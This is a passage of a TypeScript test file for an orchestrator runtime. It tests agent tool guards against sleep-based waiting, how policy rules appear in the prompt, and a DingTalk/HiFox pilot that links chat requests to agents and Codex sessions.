  expect(restarts).not.toHaveBeenCalled()
})

it('releases the database and the state directory lock when it fails to start, so it can start again in this process', async () => {
  await runtime.stop()
  const db = new DatabaseSync(join(directory, 'orchestrator.sqlite'))
  db.prepare("UPDATE kv SET value='99' WHERE key='schema'").run()
  db.close()
  const context = () => { const ctx = new Context(); for (const [name, service] of Object.entries(services)) ctx.reflect.provide(name, service); return ctx }
  expect(() => new Runtime(context(), testMachine({ stateDir: directory }), vi.fn())).toThrow('Unsupported orchestrator database version 99')
  const fixed = new DatabaseSync(join(directory, 'orchestrator.sqlite'))
  fixed.prepare('UPDATE kv SET value=? WHERE key=?').run(String(SCHEMA_VERSION), 'schema')
  fixed.close()
  // A lock kept by the failed start would make this throw that the lock is already held.
  runtime = new Runtime(context(), testMachine({ stateDir: directory }), vi.fn())
  await runtime.ready
  expect(runtime.store.get(KV.store.schema)).toBe(SCHEMA_VERSION)
})

it('refuses the main Session a bash command that runs sleep and a long job wait, as reports arrive by themselves', async () => {
  const bash = (command: string) => ({ name: 'bash', arguments: { command, description: 'x' } })
  const main = guards.get(runtime.masterId)!
  for (const command of ['sleep 60; echo done', 'cd x && sleep 5', 'gh pr checks 7 || sleep 30', 'echo a\nsleep 90', 'while true; do sleep 30; done',
    '(sleep 5)', '/bin/sleep 240', 'while sleep 30; do gh pr checks 7; done', 'if sleep 5; then gh pr view 7; fi', '{ sleep 60; }', '! sleep 5',
    'nohup sleep 60', 'exec sleep 60', 'time sleep 60', 'until sleep 1; do :; done', 'command sleep 5', 'env sleep 5'])
    expect(main(bash(command)), command).toMatch(/^Reports, follow_up notices, new candidates and a background job's end/)
  // A command that names sleep as data, not at a command position, runs.
  for (const command of ['gh api repos/acme/widgets/pulls', 'echo "sleep"', 'grep sleep file', 'sleeper --help', 'command -v sleep'])
    expect(main(bash(command)), command).toBeUndefined()
  // A command that asks to hold the step longer than 30 seconds, however it waits, under any preset.
  const timed = (command: string, args: { timeoutMs?: number; run_in_background?: boolean } = {}) =>
    ({ name: 'bash', arguments: { command, description: 'x', ...args } })
  expect(main(timed('gh api repos/acme/widgets/pulls', { timeoutMs: 120_000 }))).toMatch(/^Reports/)
  expect(main(timed("python3 -c 'import time;time.sleep(240)'", { timeoutMs: 600_000 }))).toMatch(/^Reports/)
  expect(main(timed('gh api repos/acme/widgets/pulls', { timeoutMs: 20_000 }))).toBeUndefined()
  // Under the router preset, the shell moves a command without a timeout to a background job after 5 seconds, and a job
  // wait without one ends after 5 seconds too; a longer job wait waits for nothing that arrives that way.
  expect(main(timed('gh pr checks 7 --watch'))).toBeUndefined()
  expect(main({ name: 'job_output', arguments: { job_id: 'j', wait: true } })).toBeUndefined()
  expect(main({ name: 'job_output', arguments: { job_id: 'j', wait: true, timeout_ms: 30_000 } })).toMatch(/^Reports/)
  expect(main({ name: 'job_output', arguments: { job_id: 'j', wait: true, timeout_ms: 5_000 } })).toBeUndefined()
  expect(main({ name: 'job_output', arguments: { job_id: 'j' } })).toBeUndefined()
  // A main Session created before runs under standard, whose shell waits 60 seconds by default and whose job waits last 30:
  // a command without a timeout runs in the background or names one, and a job wait names one.
  ;(agents.get(runtime.masterId) as unknown as { session: { header: { agentPreset: string } } }).session.header = { agentPreset: 'standard' }
  expect(main(timed('gh pr checks 7 --watch'))).toMatch(/^This shell waits up to 60 seconds by default: pass timeoutMs of at most 30000/)
  expect(main(timed('gh pr checks 7 --watch', { run_in_background: true }))).toBeUndefined()
  expect(main(timed('gh api repos/acme/widgets/pulls', { timeoutMs: 20_000 }))).toBeUndefined()
  expect(main({ name: 'job_output', arguments: { job_id: 'j', wait: true } })).toMatch(/^Reports/)
  expect(main({ name: 'job_output', arguments: { job_id: 'j', wait: true, timeout_ms: 5_000 } })).toBeUndefined()
  // The main Session's role says so.
  expect(masterPrompt).toContain('Worker reports, follow_up notices, new candidates and a background job\'s end, with its output, arrive by themselves as messages')
})

it('reads the main Session\'s preset from a registry with or without presetForSession, and takes standard\'s caps when it cannot', async () => {
  const watch = { name: 'bash', arguments: { command: 'gh pr checks 7 --watch', description: 'x' } }
  const route = { name: 'orchestrator_route', arguments: { decisions: [] } }
  const guard = async (registry: Record<string, unknown>, projections?: Record<string, unknown>) => {
    services.agentPresets = registry
    if (projections) services.sessionProjections = projections; else delete services.sessionProjections
    await (await restart()).ready
    return guards.get(runtime.masterId)!
  }
  // A released DSH's registry has no presetForSession: the projection says standard, so standard's caps apply, and the
  // other tools run.
  let main = await guard({ select: vi.fn() }, { stateOf: vi.fn((_session: unknown, key: string) => key === 'agentPreset' ? 'standard' : undefined) })
  expect(main(route)).toBeUndefined()
  expect(main(watch)).toMatch(/^This shell waits up to 60 seconds by default/)
  // Without the projection either, the preset it was created with counts: the router preset.
  main = await guard({ select: vi.fn() })
  expect([main(route), main(watch)]).toEqual([undefined, undefined])
  // The registry says standard though the Session was created with the router preset: standard's caps apply.
  main = await guard({ select: vi.fn(), presetForSession: () => 'standard' })
  expect(main(watch)).toMatch(/^This shell waits up to 60 seconds by default/)
  // A registry that fails is read as standard, the safer caps, and the guard does not throw.
  main = await guard({ select: vi.fn(), presetForSession: () => { throw new Error('no projection') } })
  expect(main(route)).toBeUndefined()
  expect(main(watch)).toMatch(/^This shell waits up to 60 seconds by default/)
})

it('shows the settings history when one revision holds values its Source kind no longer accepts, without that revision\'s changes', async () => {
  const settings = runtime.store.settings()
  await runtime.settings.save('executor', { ...settings.executor, maxWorkers: 4 }, runtime.store.blockRevision('executor'), 'panel')
  await runtime.settings.save('executor', { ...runtime.store.settings().executor, maxWorkers: 5 }, runtime.store.blockRevision('executor'), 'panel')
  // A revision the migration left as an earlier version wrote it, which the Feishu kind's schema rejects.
  const revision = runtime.store.get(KV.settings.revision)!
  const stored = runtime.store.get(KV.settings.version(revision - 1))!
  runtime.store.set(KV.settings.version(revision - 1), { ...stored, settings: { ...stored.settings,
    sources: { ...stored.settings.sources, feishu: { enabled: true, config: { readPageSize: 'many' } } } } })
  const history = policyHistory(runtime.store, runtime.sources, policyVersion(runtime.store.settings()))
  expect(history.items.slice(0, 2)).toEqual([expect.objectContaining({ revision, changes: null }), expect.objectContaining({ revision: revision - 1, changes: null })])
  expect(history.items[2]).toMatchObject({ revision: revision - 2 })
})

it('ends the main Session\'s prompt with its Policy section, each rule on one line, and says orchestrator_eval holds no rules', async () => {
  const settings = runtime.store.settings()
  const rules = settings.policy.rules.map(rule => rule.id === 'copy'
    ? { ...rule, name: 'Copy\nfixes', instruction: 'Fix typos.\n- Keep the tone.\n\n## Not a heading' } : rule)
  await runtime.settings.save('policy', { ...settings.policy, rules }, runtime.store.blockRevision('policy'), 'panel')
  const prompt = (sections.get(runtime.masterId)!.text as (context: object) => string)({})
  const policy = prompt.slice(prompt.indexOf('## Policy'))
  // Nothing follows the section, whose lines after its head are exactly the enabled rules.
  expect(policy.trimEnd().split('\n').slice(2)).toEqual(runtime.store.settings().policy.rules.filter(rule => rule.enabled)
    .map(rule => rule.id === 'copy' ? '- Copy fixes (copy): Fix typos. - Keep the tone. ## Not a heading' : `- ${rule.name} (${rule.id}): ${rule.instruction}`))
  expect(prompt.indexOf('## Policy')).toBeGreaterThan(prompt.indexOf('Execution environment'))
  expect((tools.get(runtime.masterId)!.get('orchestrator_eval') as unknown as { description: string }).description).not.toMatch(/rules/)
})

it('keeps the Policy the main Session judges by in its prompt, after admission and the rest, as the latest save left it', async () => {
  const prompt = () => (sections.get(runtime.masterId)!.text as (context: object) => string)({})
  const policy = () => { const text = prompt(), at = text.indexOf('## Policy'); return text.slice(at, text.indexOf('\n\n', at)) }
  const settings = runtime.store.settings()
  const line = (rule: { id: string; name: string; instruction: string }) => `- ${rule.name} (${rule.id}): ${rule.instruction}`
  expect(prompt().indexOf('## Policy')).toBeGreaterThan(prompt().indexOf('Assess proactive candidates yourself'))
  expect(policy().split('\n').filter(item => item.startsWith('- '))).toEqual(settings.policy.rules.filter(rule => rule.enabled).map(line))
  expect(policy()).toContain(`Policy version ${policyVersion(settings)}; accept mode ${settings.eval.mode}.`)
  // The rules govern proactive candidates only; read beside an explicit request, they must not be taken to refuse it.
  expect(policy()).toContain('The accept mode and the rules decide proactive candidates only: an explicit request is routed as dispatch says, in any mode and whatever the rules.')
  // A save changes it from the next request: one rule disabled, the other's instruction changed.
  const rules = settings.policy.rules.map(rule => rule.id === 'copy' ? { ...rule, instruction: `${rule.instruction} Keep it short.` } : { ...rule, enabled: false })
  await runtime.settings.save('policy', { ...settings.policy, rules }, runtime.store.blockRevision('policy'), 'panel')
  const saved = runtime.store.settings()
  expect(policy()).toContain(`Policy version ${policyVersion(saved)}`)
  expect(policy().split('\n').filter(item => item.startsWith('- '))).toEqual(rules.filter(rule => rule.enabled).map(line))
  // With no rule enabled, a proactive candidate can only be ignored.
  await runtime.settings.save('policy', { ...saved.policy, rules: rules.map(rule => ({ ...rule, enabled: false })) }, runtime.store.blockRevision('policy'), 'panel')
  expect(policy()).toContain('No rule is enabled: a proactive candidate can only be ignored.')
  expect(policy()).toContain('The accept mode and the rules decide proactive candidates only')
})

const from = '2026-11-21T01:00:00.000Z'
const to = '2026-11-21T01:15:00.000Z'
function dingTalkMessage(messageId: string, overrides: Partial<DingTalkMessage> = {}): DingTalkMessage {
  return {
    conversationId: 'pilot-chat', senderId: 'pilot-alice', human: true, at: from, addressed: 'mention', messageId,
    text: '请查资料不完整的原因。',
    ...overrides,
  }
}
function fakeHiFox() {
  const tasks: TaskReceipt[] = []
  const statuses = new Map<string, HiFoxTaskStatus>()
  const comments: (CommentReceipt & { text: string })[] = []
  const orders: HiFoxWorkOrder[] = []
  const runs: RunObservation[] = []
  const gateway = {
    agents: vi.fn<HiFoxGateway['agents']>(async () => [{ id: 'configured-agent', name: '日志 Agent', status: 'idle' }]),
    createTask: vi.fn<HiFoxGateway['createTask']>(async input => {
      const task = { ...input, taskUuid: `task-${tasks.length + 1}` }
      tasks.push(task)
      statuses.set(task.taskUuid, { name: '待开始', category: 'unstarted' })
      return task
    }),
    findTasks: vi.fn<HiFoxGateway['findTasks']>(async (space, marker) => tasks.filter(item => item.space === space && item.marker === marker)),
    taskStatus: vi.fn<HiFoxGateway['taskStatus']>(async taskUuid => statuses.get(taskUuid)!),
    setTaskStatus: vi.fn<HiFoxGateway['setTaskStatus']>(async (taskUuid, category) => {
      const current = statuses.get(taskUuid)!
      if (terminalTask(current)) return current
      const status = { category, name: { started: '进行中', completed: '已完成', canceled: '已取消' }[category] }
      statuses.set(taskUuid, status)
      return status
    }),
    comment: vi.fn<HiFoxGateway['comment']>(async input => {
      const comment = { ...input, commentId: `comment-${comments.length + 1}` }
      comments.push(comment)
      return comment
    }),
    findComments: vi.fn<HiFoxGateway['findComments']>(async (taskUuid, marker) => comments.filter(item => item.taskUuid === taskUuid && item.marker === marker)),
    summon: vi.fn<HiFoxGateway['summon']>(async ({ agent, work }) => {
      orders.push(work)
      const run: RunObservation = {
        taskUuid: work.taskUuid, conversationId: `conversation-${runs.length + 1}`, runId: `run-${runs.length + 1}`,
        launchKey: work.launchKey, launchRevision: work.inputRevision, status: 'running', agentId: agent, computerId: 'computer-1',
      }
      runs.push(run)
      return run
    }),
    runs: vi.fn<HiFoxGateway['runs']>(async taskUuid => runs.filter(item => item.taskUuid === taskUuid)),
    run: vi.fn<HiFoxGateway['run']>(async receipt => runs.find(item => item.runId === receipt.runId)),
    taskRun: vi.fn<NonNullable<HiFoxGateway['taskRun']>>(async () => undefined),
  }
  const sendDingTalk = vi.fn<HiFoxPilot['sendDingTalk']>(async () => 'sent')
  const pilot: HiFoxPilot = {
    scope: { conversationId: 'pilot-chat', space: 'space-test' },
    gateway, sendDingTalk,
  }
  const finish = (index: number, overrides = {}) => {
    const order = orders[index]!
    Object.assign(runs[index]!, {
      status: 'completed',
      report: { taskUuid: order.taskUuid, launchKey: order.launchKey, inputRevision: order.inputRevision,
        outcome: 'completed', summary: '已定位具体缺项，见工单记录 evidence-01', ...overrides },
    })
  }
  return { pilot, gateway, tasks, statuses, comments, runs, orders, finish, sendDingTalk }
}
async function startPilot(pilot: HiFoxPilot): Promise<void> {
  await restart({}, {}, pilot)
  await runtime.ready
  runtime.sources.register(feishuKind)
}
async function acceptPilot(message = dingTalkMessage('original'), title = '测试环境排障'): Promise<string> {
  expect(runtime.receiveDingTalk(message)).toBe('stored')
  await runtime.idle()
  const triggerId = key('dingtalk', message.conversationId, message.messageId)
  const result = await route({ kind: 'accept', trigger_id: triggerId, hifox_agent_id: 'configured-agent', hifox_agent_reason: '日志排查', title, acknowledgement: '收到，核对该请求的测试日志。' })
  const ticketId = (result.ticket as { ticket_id: string }).ticket_id
  expect(runtime.store.tickets.get(ticketId)?.executionTarget).toBe('hifox')
  return ticketId
}
async function advancePilot(): Promise<void> {
  runtime.store.db.prepare("UPDATE effect SET due = 0 WHERE kind = 'hifox'").run()
  await runtime.pump()
  await runtime.idle()
}
const lastPilotReport = (ticketId: string) => runtime.store.tickets.get(ticketId)?.assignments.at(-1)?.report
const hasPythonBridgeRuntime = typeof process.getuid === 'function'
  && spawnSync('python3', ['-B', '-c', 'import sys; raise SystemExit(sys.version_info < (3, 9))']).status === 0

describe('DingTalk HiFox pilot', () => {
  it.each([
    { paused: false, enabled: true, starts: true },
    { paused: true, enabled: true, starts: false },
    { paused: false, enabled: false, starts: false },
  ])('starts the managed listener on startup with paused=$paused and source enabled=$enabled', async ({ paused, enabled, starts }) => {
    const { pilot } = fakeHiFox()
    const listener = new DingTalkListener({ cli: process.execPath, profile: 'corp:user' }, pilot.scope,
      vi.fn(), vi.fn(), vi.fn())
    const start = vi.spyOn(listener, 'start').mockReturnValue({ state: 'starting' })
    pilot.createDingTalkListener = () => listener
    const settings = runtime.store.settings()
    runtime.store.saveSettings({ ...settings, paused, sources: { ...settings.sources, dingtalk: { enabled, config: {} } } })

    await startPilot(pilot)

    expect(start).toHaveBeenCalledTimes(starts ? 1 : 0)
  })

  it('finishes two original cards independently from one local Codex session and preserves the result across restart', async () => {
    const remote = fakeHiFox()
    await startPilot(remote.pilot)
    const backend = await acceptPilot(dingTalkMessage('backend'), '后端计算')
    remote.finish(0, { outcome: 'blocked', summary: '等待项目' })
    await advancePilot()
    const client = await acceptPilot(dingTalkMessage('client'), '客户端展示')
    remote.finish(1, { outcome: 'blocked', summary: '等待项目' })
    await advancePilot()
    const delivery = vi.fn(async ({ title }: { title: string }) => ({ threadId: 'same-session', evidenceLines: title === '后端计算' ? [1, 2] : [2, 3],
      summary: title === '后端计算' ? '接口返回已核验' : 'App 展示和提交已核验' }))
    const pilot = { ...remote.pilot, codexHistory: { delivery } }
    for (let pass = 0; pass < 2; pass++) {
      await restart({}, {}, pilot)
      await runtime.ready
      await advancePilot()
    }
    expect(remote.statuses.get('task-1')?.category).toBe('completed')
    expect(remote.statuses.get('task-2')?.category).toBe('completed')
    expect(remote.comments.filter(row => row.text.includes('已核验')).map(row => [row.taskUuid, row.text.split('\n').at(-1)])).toEqual([
      ['task-1', '接口返回已核验'], ['task-2', 'App 展示和提交已核验'],
    ])
    expect(runtime.store.tickets.get(backend)?.ended?.outcome).toBe('completed')
    expect(runtime.store.tickets.get(client)?.ended?.outcome).toBe('completed')
    expect(remote.gateway.summon).toHaveBeenCalledTimes(2)
    expect(delivery).toHaveBeenCalledTimes(2)
  })

  it('requires overlap with specific card content when evaluating a Codex session', () => {
    const project = { id: 'crm-project', name: 'crm-admin', cwd: '/work/crm-admin' }
    const summary = '检查 CRM 中间件超时。注意下载文件，核对命令与资料。'
    expect(matchCodexWork('注意下载文件，核对命令和 CRM 资料。', [project],
      [{ id: 'unrelated', projectId: project.id, title: '排查超时', status: 'active', summary }],
      'CRM 后台佣金申请列表的 sourceType 必须支持旺宝来源')).toBeUndefined()
    expect(matchCodexWork('https://app.hifox.com/fshows/task/FSH-9，分支 feature/merchant-scene-voiceover，识别重复画面。', [project],
      [{ id: 'tax-session', projectId: project.id, title: '测试开票税点', status: 'idle',
        summary: '新增税点配置。删除重复数据。https://example.test/fshows，feature/merchant-payment。' }],
      '口播/剪辑优化：视频按关键帧切割、客户端识别空镜调研、新增 featureId 与口播删除')).toBeUndefined()
  })

  it('links a local session by its original request even when the ticket has no predefined delivery rule', async () => {
    const home = join(directory, 'local-codex')
    const project = join(realpathSync(directory), 'crm')
    const threadId = '4baf40ea-2fb3-4e42-8de6-d22fd3e23d0b'
    const rollout = join(home, 'sessions', `rollout-${threadId}.jsonl`)
    mkdirSync(join(home, 'sessions'), { recursive: true })
    mkdirSync(project)
    writeFileSync(rollout, JSON.stringify({ type: 'response_item', timestamp: '2026-11-27T04:00:00Z',
      payload: { type: 'message', role: 'user', content: [{ text: 'CRM 后台佣金申请列表支持按 sourceType 查询旺宝来源' }] } }))
    const index = new DatabaseSync(join(home, 'state_5.sqlite'))
    index.exec('CREATE TABLE threads (id, cwd, rollout_path, title, first_user_message, preview, updated_at)')
    index.prepare('INSERT INTO threads VALUES (?, ?, ?, ?, ?, ?, ?)').run(threadId, project, rollout, '本周迭代', '', '',
      Date.parse('2026-11-27T04:00:00Z') / 1000)
    index.close()

    const remote = fakeHiFox()
    await startPilot(remote.pilot)
    const id = await acceptPilot(dingTalkMessage('crm'), 'CRM 后台佣金申请列表 sourceType 写死为付呗，需支持旺宝来源')
    remote.finish(0, { outcome: 'blocked', summary: '等待项目' })
    await advancePilot()
    await startPilot({ ...remote.pilot, codexHistory: localCodexHistory([project], home) })
    await advancePilot()

    expect((await api('GET', `tickets/${id}`)).body).toMatchObject({
      hifox: { codexProject: 'crm', codexThreadId: threadId, taskStatus: { category: 'started' } },
    })
    expect(lastPilotReport(id)?.state).toBe('blocked')
    expect(remote.gateway.summon).toHaveBeenCalledTimes(1)
  })

  it('rechecks blocked HiFox cards against Codex work summaries after restart without starting duplicate work', async () => {
    const remote = fakeHiFox()
    await startPilot(remote.pilot)
    const id = await acceptPilot()
    remote.finish(0, { outcome: 'blocked', summary: '请提供项目。' })
    await advancePilot()
    expect(lastPilotReport(id)?.state).toBe('blocked')

    const project = { id: 'tax-project', name: 'tax-app', cwd: '/work/tax-app' }
    const taskContent = vi.fn(async () => '移动端计算税额，覆盖优惠券、舍入和分摊的组合。')
    const desktop = {
      projects: vi.fn(async () => [project]),
      threads: vi.fn(async () => [{ id: 'already-running', projectId: project.id, title: '迭代开发', status: 'active',
        summary: '在做本轮迭代。' }]),
      content: vi.fn(async () => '检查优惠券导致的税额偏差，并为分摊及舍入补齐回归。'),
      status: vi.fn(async () => 'active'), create: vi.fn(async () => 'duplicate'),
    }
    await restart({}, {}, { ...remote.pilot, gateway: { ...remote.gateway, taskContent }, codexDesktop: desktop })
    await runtime.ready
    await advancePilot()
    expect(taskContent).toHaveBeenCalledWith('task-1', expect.any(AbortSignal))
    expect(runtime.hiFox?.status(id)?.codex).toMatchObject({ threadId: 'already-running', project })
    expect(lastPilotReport(id)?.state).toBe('progress')
    expect(remote.comments.map(row => row.text).join('\n')).toContain('事项内容吻合')
    expect(remote.gateway.summon).toHaveBeenCalledTimes(1)
    expect(desktop.create).not.toHaveBeenCalled()
    expect(remote.tasks).toHaveLength(1)
  })

  it('uses the busy Codex session to find its project, then tracks a new session on the same HiFox card', async () => {
    const remote = fakeHiFox()
    const project = { id: 'tax-project', name: 'tax-app', cwd: '/work/tax-app' }
    const busy = { id: 'busy-thread', title: 'FSH-42 实现税点计算', projectId: project.id, status: 'active' }
    const desktop = {
      projects: vi.fn(async () => [project]), threads: vi.fn(async () => [busy]),
      create: vi.fn(async () => 'new-thread'), status: vi.fn(async () => 'active'),
    }
    const pilot = { ...remote.pilot, codexDesktop: desktop }
    await startPilot(pilot)
    const ticketId = await acceptPilot(dingTalkMessage('original', { text: 'FSH-42 补上空值校验。' }))
    await advancePilot()
    expect(desktop.create).toHaveBeenCalledExactlyOnceWith(project, expect.stringContaining('[DSH '), expect.stringContaining('补上空值校验'), expect.any(AbortSignal))
    expect(desktop.status).toHaveBeenCalledWith('new-thread', expect.any(AbortSignal))
    expect(remote.comments.map(row => row.text).join('\n')).toContain('codex://threads/new-thread')
    expect(remote.gateway.summon).not.toHaveBeenCalled()
    expect(remote.statuses.get('task-1')?.name).toBe('进行中')
    await restart({}, {}, pilot)
    await runtime.ready
    await advancePilot()
    expect(desktop.create).toHaveBeenCalledTimes(1)
    expect(runtime.hiFox?.status(ticketId)?.codex?.threadId).toBe('new-thread')
    expect(remote.tasks).toHaveLength(1)
  })

  it('reconciles a lost Codex creation receipt by exact project and name without dispatching again', async () => {
    const remote = fakeHiFox()
    const project = { id: 'tax-project', name: 'tax-app', cwd: '/work/tax-app' }
    const threads: { id: string; projectId: string; title: string; status: string }[] = []
    const desktop = {
      projects: vi.fn(async () => [project]), threads: vi.fn(async () => threads),
      create: vi.fn(async (_project: typeof project, title: string) => {
        threads.push({ id: 'recovered-thread', projectId: project.id, title, status: 'active' })
        throw new Error('lost receipt')
      }),
      status: vi.fn(async () => 'active'),
    }
    const pilot = { ...remote.pilot, codexDesktop: desktop }
    await startPilot(pilot)
    const ticketId = await acceptPilot(dingTalkMessage('original', { text: 'tax-app 补上空值校验。' }))
    expect(runtime.hiFox?.status(ticketId)?.codex?.pending).toBeDefined()
    await restart({}, {}, pilot)
    await runtime.ready
    await advancePilot()
    expect(runtime.hiFox?.status(ticketId)?.codex?.threadId).toBe('recovered-thread')
    expect(desktop.create).toHaveBeenCalledTimes(1)
    expect(remote.gateway.summon).not.toHaveBeenCalled()
  })

  it('links an idle exact Codex task and leaves conflicting project matches for confirmation', async () => {
    const remote = fakeHiFox()
    const project = { id: 'tax-project', name: 'tax-app', cwd: '/work/tax-app' }
    const other = { id: 'other-project', name: 'other-app', cwd: '/work/other-app' }
    const desktop = {
      projects: vi.fn(async () => [project, other]),
      threads: vi.fn(async () => [{ id: 'original-thread', title: 'FSH-42 实现税点计算', projectId: project.id, status: 'idle' }]),
      create: vi.fn(async () => 'new-thread'), status: vi.fn(async () => 'idle'),
    }
    await startPilot({ ...remote.pilot, codexDesktop: desktop })
    const linked = await acceptPilot(dingTalkMessage('original', { text: '继续跟进 FSH-42。' }))
    expect(runtime.hiFox?.status(linked)?.codex?.threadId).toBe('original-thread')
    const ambiguous = await acceptPilot(dingTalkMessage('another', { text: 'tax-app 和 other-app 的修复，请继续。' }))
    expect(lastPilotReport(ambiguous)?.summary).toContain('多个可能的 Codex 项目')
    expect(desktop.create).not.toHaveBeenCalled()
    expect(remote.gateway.summon).not.toHaveBeenCalled()
  })

  it('accepts addressed requests across conversations and isolates equal message and quote IDs', async () => {
    const remote = fakeHiFox()
    await startPilot({ ...remote.pilot, scope: { space: 'space-test' }, requireTerminalOrigin: true })
    const group = dingTalkMessage('group-root', { senderId: 'new-group-sender' })
    const ticketId = await acceptPilot(group)
    const otherChat = dingTalkMessage('group-root', { conversationId: 'other-room', addressed: 'direct', senderId: 'new-direct-sender' })
    const foreignQuote = dingTalkMessage('other-followup', { conversationId: 'parallel-group', replyToMessageId: group.messageId })
    expect(runtime.receiveDingTalk(otherChat)).toBe('stored')
    expect(runtime.receiveDingTalk(foreignQuote)).toBe('stored')
    await runtime.idle()
    expect(runtime.store.tickets.get(ticketId)?.inputs).toEqual([])
    expect(remote.orders[0]?.initialClues).toMatchObject([{ conversationId: group.conversationId, messageId: group.messageId }])
    expect(runtime.store.triggers.get(key('dingtalk', 'other-room', group.messageId))?.addressed).toBe('direct')
    expect(runtime.engine.candidate(key('dingtalk', 'other-room', group.messageId))?.strength).toBe('explicit')
    remote.finish(0)
    await advancePilot()
    expect(remote.sendDingTalk).toHaveBeenCalledTimes(1)
    expect(remote.sendDingTalk.mock.calls[0]?.[0].channel.address)
      .toEqual({ conversationId: group.conversationId, messageId: group.messageId })
  })

  it('selects a matching Agent using verified DingTalk context and keeps that selection after restart', async () => {
    const remote = fakeHiFox()
    const agents = [{ id: 'configured-agent', name: '日志 Agent', status: 'idle' },
      { id: 'docs-agent', name: '文档 Agent', status: 'idle', skills: ['权限排查'] }]
    remote.gateway.agents.mockResolvedValue(agents)
    const readContext = vi.fn<NonNullable<HiFoxPilot['readDingTalkContext']>>(async () => ({
      quoted_message: { message_id: 'quoted-docs', text: '在线文档访问权限报错，请查原因。' },
      preceding_messages: [{ message_id: 'nearby-docs', text: '工单涉及知识库的入门文档。' },
        { message_id: 'unrelated', text: '周末团建' }],
    }))
    remote.pilot.readDingTalkContext = readContext
    await startPilot(remote.pilot)
    expect(await api('GET', 'hifox/agents')).toEqual({ status: 200, body: { agents } })
    const message = dingTalkMessage('route-for-docs', { text: '帮忙看下', replyToMessageId: 'quoted-docs' })
    expect(runtime.receiveDingTalk(message)).toBe('stored')
    await runtime.idle()
    const id = key('dingtalk', 'pilot-chat', message.messageId)
    expect(await runTool(runtime.masterId, 'orchestrator_dingtalk_context', { trigger_id: id })).toMatchObject({
      original: { text: '帮忙看下' }, quoted_message: { message_id: 'quoted-docs' },
    })
    expect(readContext).toHaveBeenCalledWith({ conversationId: 'pilot-chat', messageId: 'route-for-docs',
      quotedMessageId: 'quoted-docs', at: from }, expect.any(AbortSignal))
    expect(await runTool(runtime.masterId, 'orchestrator_hifox_agents', { trigger_id: id }))
      .toEqual({ space: 'space-test', agents })
    const item = { kind: 'accept', trigger_id: id, title: '文档权限排查', acknowledgement: '核对在线文档权限错误。',
      hifox_agent_reason: '直接引用的请求要查文档权限，候选 Agent 有权限排查技能。', note: '涉及知识库的入门文档。' }
    await expect(route({ ...item, hifox_agent_id: 'unknown-agent' })).rejects.toThrow('unavailable in this Space')
    expect(remote.tasks).toHaveLength(0)
    const { ticket } = await route({ ...item, hifox_agent_id: 'docs-agent' })
    const ticketId = (ticket as { ticket_id: string }).ticket_id
    expect(remote.gateway.summon).toHaveBeenCalledWith(expect.objectContaining({ agent: 'docs-agent',
      work: expect.objectContaining({ routingNote: item.note, quotedClue: { conversationId: 'pilot-chat', messageId: 'quoted-docs',
        text: '在线文档访问权限报错，请查原因。' } }) }), expect.any(AbortSignal))
    expect(JSON.stringify(remote.orders)).not.toContain('周末团建')
    await expect(runTool(runtime.masterId, 'orchestrator_dingtalk_context', { trigger_id: id }))
      .rejects.toThrow('active, admitted candidate')
    await restart({}, {}, remote.pilot)
    await runtime.ready
    expect(runtime.store.tickets.get(ticketId)?.hiFoxAgent).toEqual({ space: 'space-test', agentId: 'docs-agent', agentName: '文档 Agent' })
    expect(remote.gateway.summon).toHaveBeenCalledTimes(1)
  })

  it('records a manual decision when there is no suitable Agent and does not create a ticket', async () => {
    const remote = fakeHiFox()
    remote.gateway.agents.mockResolvedValue([])
    await startPilot(remote.pilot)
    expect(runtime.receiveDingTalk(dingTalkMessage('manual'))).toBe('stored')
    await runtime.idle()
    const id = key('dingtalk', 'pilot-chat', 'manual')
    expect(await route({ kind: 'manual', trigger_id: id, reason: '没有适合排查权限的 Agent' })).toMatchObject({
      decision: 'unavailable', reason: '没有适合排查权限的 Agent',
    })
    expect(runtime.store.tickets.list()).toHaveLength(0)
    expect(remote.gateway.createTask).not.toHaveBeenCalled()
  })

  it('blocks before creating a Task when the selected Agent disappears after acceptance', async () => {
    const remote = fakeHiFox()
    remote.gateway.agents.mockResolvedValue([{ id: 'another-agent', name: '另一位 Agent', status: 'idle' }])
      .mockResolvedValueOnce([{ id: 'configured-agent', name: '原选 Agent', status: 'idle' }])
    await startPilot(remote.pilot)
    const ticketId = await acceptPilot()
    expect(runtime.store.tickets.get(ticketId)?.hiFoxAgent?.agentId).toBe('configured-agent')
    expect(lastPilotReport(ticketId)?.summary).toContain('原选定的 HiFox Agent')
    expect(remote.gateway.createTask).not.toHaveBeenCalled()
    expect(remote.gateway.summon).not.toHaveBeenCalled()
  })

  it.skipIf(!hasPythonBridgeRuntime)('accepts DWS events from the Python bridge and deduplicates a lost local receipt after the bridge restarts', async () => {
    const remote = fakeHiFox()
    const endpoint = join(directory, 'ding.sock')
    expect(existsSync(endpoint)).toBe(false)
    await startPilot({ ...remote.pilot, dingTalkSocket: true })
    expect(existsSync(endpoint)).toBe(true)
    const listener = fileURLToPath(new URL('../scripts/dingtalk-listener.py', import.meta.url))
    const events = [
      {
        type: 'user_im_message_receive_at', conversation_id: 'pilot-chat', message_id: 'socket-root',
        sender: 'Display name cannot grant access', sender_open_dingtalk_id: 'pilot-alice',
        create_time: String(Date.parse(from)),
        content: '请查资料不完整的原因。',
      },
      {
        type: 'user_im_message_receive_at', conversation_id: 'pilot-chat', message_id: 'socket-followup',
        sender_open_dingtalk_id: 'pilot-bob', content: '追加线索',
        create_time: Date.parse(to) / 1000, quoted_message: { conversation_id: 'pilot-chat', message_id: 'socket-root' },
      },
    ]
    const bridge = `import json, pathlib, runpy, sys
script, state, endpoint, events, stage = sys.argv[1:]
bridge = runpy.run_path(script)
db = bridge["connect_db"](pathlib.Path(state))
pilot = bridge["Pilot"]("pilot-chat", pathlib.Path(endpoint))
for event in json.loads(events):
    bridge["enqueue"](db, json.dumps(event), pilot)
if stage == "lost":
    def lose_ack(address, payload):
        bridge["socket_delivery"](address, payload)
        raise bridge["Retry"]("test_lost_ack")
    bridge["dispatch_pilot"](db, lose_ack, clock=lambda: 10)
else:
    bridge["dispatch_pilot"](db, clock=lambda: 100)
    bridge["dispatch_pilot"](db, clock=lambda: 100)
db.close()
`
    const python = (stage: string) => promisify(execFile)('python3', [
      '-B', '-c', bridge, listener, directory, endpoint, JSON.stringify(events), stage,
    ], { timeout: 5000 })
    const id = key('dingtalk', 'pilot-chat', 'socket-root')
    await python('lost')
    await runtime.idle()
    expect(runtime.store.triggers.get(id)).toMatchObject({ actor: { id: 'pilot-alice' }, at: from })
